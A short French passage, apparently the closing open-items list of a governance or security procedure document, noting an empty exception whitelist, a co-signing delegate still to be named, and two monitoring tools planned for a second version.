    - Whitelist d'exceptions (section 3.7) actuellement vide — à surveiller à chaque revue trimestrielle
    - Délégué co-signeur à désigner formellement (mentionné dans 4.3 et R-O2)
    - Implémentation des outils tools/vbb-bypass-lint.py et tools/vbb-process-tree-watcher.py à planifier en V2
```
